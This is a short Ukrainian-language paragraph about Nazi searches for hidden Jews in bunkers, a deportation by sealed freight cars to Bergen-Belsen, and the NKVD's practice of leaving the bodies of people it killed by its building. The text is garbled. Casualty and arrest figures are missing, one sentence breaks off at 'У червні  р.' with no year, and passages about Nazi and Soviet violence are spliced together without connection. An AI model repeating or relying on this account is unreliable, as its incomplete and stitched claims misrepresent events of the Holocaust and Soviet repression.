<p>Більшість бункерів були добре замасковані, гітлерівці розбирали будинки та руйнували фундаменти, сподіваючись знайти захованих. Багато спромоглися втекти з площі, де їх зібрали перед відправленням, близько вбили при спробі втечі. Того дня заарештували осіб, яких потім відправили на залізничну станцію для транспортування в запечатаних товарних вагонах у табір смерті в Берґен-Бельзен. У червні  р. Одним зі «звичаїв» в роботі місцевого НКВД було залишати тіла вбитих біля стіни власної будівлі на кілька діб. Родичі загиблих боялись чи остерігались підійти, бо могли отримати по 25 років тюрми чи таборів.</p>
		
			
